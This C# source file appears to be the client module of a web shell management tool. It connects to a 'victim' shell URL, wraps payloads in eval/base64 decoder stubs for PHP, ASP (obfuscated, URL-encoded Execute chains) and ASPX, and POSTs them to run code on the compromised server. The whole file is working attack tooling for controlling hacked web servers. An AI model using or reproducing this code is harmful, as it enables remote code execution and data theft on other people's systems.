using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection.Metadata;
using System.Text;
using System.Threading.Tasks;

namespace Alien
{
    public class clsWeb
    {
        public clsVictim m_victim { get; set; }
        public HttpClient m_clnt { get; set; }

        private Dictionary<Language, string> m_dicSuffix = new Dictionary<Language, string>()
        {
            { Language.PHP, "php" },
            { Language.ASP, "asp" },
            { Language.ASPX, "aspx" },
            { Language.ASMX, "asmx" },
            { Language.ASHX, "ashx" },
            { Language.JSP, "jsp" },
            { Language.JSPX, "jspx" },
            { Language.CGI, "cgi" },
            { Language.Python, "py" },
        };
        private Dictionary<Language, string[]> m_dicRemoveSyntax = new Dictionary<Language, string[]>()
        {
            {
                Language.PHP,
                new string[]
                {
                    "<?php", "?>",
                }
            },
            {
                Language.ASP,
                new string[]
                {
                    "<%", "%>",
                }
            }
        };
        private Dictionary<Language, string> m_dicDecodeFunc = new Dictionary<Language, string>()
        {
            { Language.PHP, "@eval(base64_decode('[PATTERN]'));" },
            { Language.ASP, @"Execute(""Execute(""""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Execute(""""""""On+Error+Resume+Next:""""""""%26bd(""""""""[PATTERN]"""""""")):Response.End"""")"")" },
            { Language.ASPX, @"var a0=Request.Item[""PATTERN""];var err:Exception;eval(System.Text.Encoding.GetEncoding(""[WEncoding]"").GetString(System.Convert.FromBase64String(a0)),""unsafe"");Response.End();" }
        };
        private Dictionary<Language, string> m_dicSplitter = new Dictionary<Language, string>()
        {
            { Language.PHP, "echo(\"[SPLITTER]\");" },
            { Language.ASP, "Response.Write(\"[SPLITTER]\");" },
            { Language.ASPX, "Response.Write(\"[SPLITTER]\");" }
        };

        public clsWeb(clsVictim victim)
        {
            Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

            m_victim = victim;
            m_clnt = new HttpClient()
            {
                BaseAddress = new Uri(m_victim.ShellURL),
            };
        }

        /// <summary>
        /// HTTP POST request.
        /// </summary>
        /// <param name="szPayloadData"></param>
        /// <param name="szSplitter"></param>
        /// <returns></returns>
        public async Task<string> fnHttpPOST(string szPayloadData, string szSplitter)
        {
            Clipboard.SetText(szPayloadData);
            StringContent content = new StringContent(szPayloadData, Encoding.GetEncoding(m_victim.ShellEncoding), "application/x-www-form-urlencoded");
            HttpResponseMessage resp = await m_clnt.PostAsync(string.Empty, content);
            string szRespContent = await resp.Content.ReadAsStringAsync();

            szSplitter = $"[{szSplitter}]";

            if (resp.IsSuccessStatusCode && szRespContent.Contains(szSplitter))
            {
                return szRespContent = szRespContent.Split(szSplitter)[1];
            }
            else
            {
                frmMsgBox f = new frmMsgBox(resp.StatusCode.ToString(), szRespContent);
                return string.Empty;
            }
        }

        /// <summary>
        /// Do HTTP web connection to check alive.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestWebConnection()
        {
            try
            {
                using (HttpResponseMessage resp = await m_clnt.GetAsync(string.Empty))
                {
                    resp.EnsureSuccessStatusCode();

                    using (HttpContent content = resp.Content)
                    {
                        string szResult = await content.ReadAsStringAsync();
                        return resp.IsSuccessStatusCode;
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestWebConnection()");
                return false;
            }
        }

        /// <summary>
        /// Execute test payload.
        /// </summary>
        /// <returns></returns>
        public async Task<bool> fnbTestShellConnection()
        {
            try
            {
                string szPattern = clsEzData.fnszGenerateRandomStr();
                string szResp = await fnszSendPayload("test", new string[] { szPattern });

                return string.Equals(szResp, szPattern);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "fnbTestShellConnection()");
                return false;
            }
        }

        public async Task<string> fnszSendPayload(string szPayloadName) => await fnszSendPayload(szPayloadName, new string[] { });
        public async Task<string> fnszSendPayload(string szPayloadName, string[] asParams)
        {
            string szSplitter = clsEzData.fnszGenerateRandomStr();
            string szPayload = fnGetPayload(szPayloadName, szSplitter);

            for (int i = 0; i < asParams.Length; i++)
                asParams[i] = $"z{i}={clsEzData.fnszStre2b64(asParams[i])}";

            string szParams = string.Join("&", asParams);
            szPayload = $"{m_victim.ShellPassword}={m_dicDecodeFunc[m_victim.ShellLanguage].Replace("[PATTERN]", clsEzData.fnszStre2b64(szPayload))}&{szParams}";

            return await fnHttpPOST(szPayload, szSplitter);
        }

        /// <summary>
        /// Read payload from file with specified language, method and payload type.
        /// </summary>
        /// <param name="szPayloadName">Payload name, also represents to file name.</param>
        /// <returns>Payload content</returns>
        private string fnGetPayload(string szPayloadName, string szSplitter)
        {
            string szSuffix = m_dicSuffix[m_victim.ShellLanguage];
            string szPayloadFilePath = Path.Combine(new string[]
            {
                "Payload",
                m_victim.ShellLanguage.ToString(),
                m_victim.ShellMethod,
                m_victim.ShellPayloadType.ToString(),
                $"{szPayloadName}.{szSuffix}",
            });

            if (File.Exists(szPayloadFilePath))
            {
                string szPayload = File.ReadAllText(szPayloadFilePath);
                foreach (string szPattern in m_dicRemoveSyntax[m_victim.ShellLanguage])
                    szPayload = szPayload.Replace(szPattern, string.Empty);

                string szSplitFunc = m_dicSplitter[m_victim.ShellLanguage].Replace("SPLITTER", szSplitter);
                szPayload = $"{szSplitFunc}{szPayload}{szSplitFunc}";

                return szPayload;
            }
            else
            {
                MessageBox.Show("File not found: " + szPayloadFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return string.Empty;
            }
        }
    }
}
